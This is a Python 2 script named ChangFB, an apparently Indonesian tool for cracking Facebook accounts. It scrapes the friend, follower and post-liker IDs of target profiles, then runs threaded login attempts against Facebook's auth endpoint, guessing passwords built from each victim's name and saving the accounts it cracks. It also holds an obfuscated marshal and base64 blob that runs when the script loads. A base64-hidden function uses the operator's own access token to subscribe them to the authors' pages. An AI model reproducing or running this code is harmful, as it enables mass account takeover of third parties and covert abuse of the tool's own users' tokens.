#!/usr/bin/python2
# coding=utf-8
# coding by romi & mbokey
#123

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 	
 - author      : Changcuters
 - facebook    : facebook.com/Changcuters
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282261310817
 - github      : github.com/Changcuters
 - script name : ChangFB
 - version     : 1.9
 
 - author      : Changcuters
 - facebook    : facebook.com/Changcuters
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282261310817
 - github      : github.com/Changcuters
 - script name : ChangFB
 - version     : 1.9

%s"""%(Hj,Mt))
til = "[+]"
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
def folder():
	try:os.mkdir('dump')
	except:pass
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
jembut = ("%s────────────────────────────────────────────────────"%(P))
orange = '\x1b[38;2;255;127;0;1m'
def kotak():
	print("""%s______________________________________________________
| Sebelum Memulai Crack Harap Mendump Id Dulu        |
| Jika Ada Yang Eror Anda Bisa Mengubungi Chang Di. |
| Facebook Jika Tidak Membunyai Nomer Nya Karna.     |
| Nomer Nya Terlalu Private Sebab Karna Itu Hubungi. |
| Lewat Facebook Saja %s#Skrng Rawa Nya Bocil ngep".%s   |
|____________________________________________________|"""%(orange,M,orange))
def banner():
	print("""%s
\033[0;97m  ____ _
\033[0;91m / ___| |__   __ _ _ __   __ _
\033[0;96m| |   | '_ \ / _` | '_ \ / _` |
\033[0;92m| |___| | | | (_| | | | | (_| |
\033[0;91m \____|_| |_|\__,_|_| |_|\__, |
                         |___/ChangFB
\033[0;96m╔═════════════════════════════════════╗
\033[0;96m╚═════════════════════════════════════╝"""%(P))
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s [01] Login via token \n [02] Cara mendapatkan token \n [%s00%s] Keluar'%(P,M,P))
    mbo = raw_input('\n%s [?] Menu : %s'%(P,H))
    if mbo in(""):
    	print("%s [!] Isi yang benar kentod "%(M));exit()
    elif mbo in ('1','01'):
        jalan("\n%s [%s!%s] Wajib gunakan akun tumbal dilarang akun utama"%(P,M,P))
    	romz = raw_input('%s [?] Token : %s'%(P,H))
        if romz in(""):
        	print("%s [!] Isi yang benar kentod "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[√] Login berhasil, mohon tunggu '%(H));jeda(2)
            open('token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print("%s [!] Token invalid "%(M));masuk()
    elif mbo in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %sview-source:https://business.facebook.com/business_locations"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAG %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        bertanya = raw_input('%s [?] Anda paham? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
        if bertanya in(""):
        	print ("%s [!] saya bertanya wajib di jawab "%(M));jeda(2);masuk()
        elif bertanya in("y","Y"):
        	print ("\n%s [√] selamat anda pintar :* "%(H));jeda(2);masuk()
        elif bertanya in("n","N"):
        	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif mbo in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] Isi yang benar kentod "%(M));exit()
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
        idt = raw_input(' [∆] Target id : %s'%(H))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '%s '%(a['name'])
            print '\r%s [∆] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,H,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
        
def massal(romz, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
    	print "\n%s [%s+%s] %sUsahakan Tumbal Akun Menggunakan Token EAAAAU"%(P,U,P,H)
        jum = int(raw_input('\n%s [%s+%s] Jumlah id%s : %s'%(P,H,P,U,H)))
    except:
        jum = 1

    simpan = raw_input('%s [%s+%s] Nama file%s : %s' %(P,H,P,U,H))
    print "\n%s [%s+%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri " % (P,H,P,K,P)
    file = ('dump/' + simpan + '.json').replace(' ', '_')
    bff = open(file, 'w')
    for t in range(jum):
        t += 1
        idt = raw_input('%s [%s+%s] Target id : %s'%(P,H,P,H))
        try:
            for _x_ in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, romz)).json()['data']:
                id.append(_x_['id'] + '<=>' + _x_['name'])
                bff.write(_x_['id'] + '<=>' + _x_['name'] + '\n')

        except KeyError:
            exit('\n%s [%s+%s] id tidak public'%(P,H,P))

    bff.close()
    print '%s [%s+%s] Total id : %s'%(P,H,P,len(id))
    print '\n%s [%s+%s] Succes dump id massal '%(P,H,P)
    print '%s [%s+%s] File dump tersimpan : %s '%(P,H,P,file)
    raw_input('\n%s [%s Enter%s ] '%(P,H,P))
    menu()
# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,M,P,H,P))
        idt = raw_input(' [∆] Target id : %s'%(H))
        batas = raw_input(' %s[∆] Maximal id : %s'%(P,H))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [∆] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
        print (' %s[%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,H,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	#bff = open(file, 'w')
    #	print ("[+] File Hasil Dump anda : %s "%(file))
    	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(P,M,P))
        idt = raw_input(' [∆] Id post   : %s'%(P))
        simpan = raw_input(' %s[?] Nama file : %s'%(P,H))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id postingan '%(P,H,P))
        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,H,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
# START CRACK
class ngentod:

    def __init__(self):
        self.id = []
        dirs = os.listdir("dump")
        for file in dirs:
        	print("\n%s [%s+%s] Hasil Dump Anda %s√"%(P,H,P,H))
        	print("%s -> %sdump/%s"%(H,P,file));jeda(0.2)
    def romiy(self):
        try:
            self.apk = raw_input('\n %s[?] file dump :%s '%(P,P))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s∆%s] jumlah id : %s%s' %(P,P,P,H,len(self.id))
        except:
            print '\n%s [!] File dump tidak ada, dump id dulu kentod'%(M)
            raw_input('\n%s [ %senter %s] '%(P,H,P));menu()
        unikers = raw_input('%s [?] ingin gunakan password manual? [y/t] :%s '%(P,H))
        if unikers in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
            while True:
                pwx = raw_input(' %s[?] set password :%s '%(P,H))
                if pwx == '':
                    print '\n %s[!] jangan kosong '%(M)
                elif len(pwx)<=5:
                    print '\n %s[!] password minimal 6 karakter'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n %s[?] methode : %s'%(P,H))
                        if ind == '':
                            print("%s [!] Isi yang benar kentod "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '\n    %s>>>>>>>>>>>> %sSemoga Hari Mu suram %s<<<<<<<<<<<<\n'%(P,K,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '\n    %s>>>>>>>>>>>> %sSemoga Hari Mu suram %s<<<<<<<<<<<<\n'%(P,K,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '\n    %s>>>>>>>>>>>> %sSemoga Hari Mu suram %s<<<<<<<<<<<<\n'%(P,K,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s[!] isi yang benar kentod'%(M));zona()
                    print '\n%s [ pilih methode crack ]\n'%(P)
                    print ' [%s01%s] methode b-api  | %sSuper Fast'%(P,P,H)
                    print ' %s[02%s] methode mbasic | %sSuper Slow'%(P,P,H)
                    print ' %s[03%s] methode mobile | %sPro Slow '%(P,P,H)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s [ pilih methode crack ]\n'%(P)
            print ' [%s01%s] methode b-api  | %sSuper Fast'%(P,P,H)
            print ' %s[02%s] methode mbasic | %sSuper Slow'%(P,P,H)
            print ' %s[03%s] methode mobile | %sPro Slow '%(P,P,H)
            self.langsung()
        else:
            print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s '%(P,H))
        if suuu == '':
            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s∆%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s∆%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '\n    %s>>>>>>>>>>>> %sSemoga Hari Mu suram %s<<<<<<<<<<<<\n'%(P,K,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345", _i_[0]+"1234"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345", _i_[0]+"1234"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):
            print '\n%s [%s∆%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s∆%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '\n    %s>>>>>>>>>>>> %sSemoga Hari Mu suram %s<<<<<<<<<<<<\n'%(P,K,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345", _i_[0]+"1234"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345", _i_[0]+"1234"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):
            print '\n %s[%s∆%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s∆%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '\n    %s>>>>>>>>>>>> %sSemoga Hari Mu suram %s<<<<<<<<<<<<\n'%(P,K,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345", _i_[0]+"1234"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345", _i_[0]+"1234"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("\n%s [!] Isi yang benar kentod "%(M));self.langsung()
    def b_api(self, user, zona):
    	#Sungkem Bang
    	#123
    	#1234
    	#12345
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
			#mbokey_X_wulan = 'https://b-api.facebook.com/v2.0/method/auth.login'
            mbokey_tamvan = 'https://b-api.facebook.com/v2.0/method/auth.login'
        #    response = ses.get(mbokey_X_wulan + '?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            response = ses.get(mbokey_tamvan + '?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s--> %s ∆ %s ∆ %s ' % (H,user,pw,response.json()['access_token'])
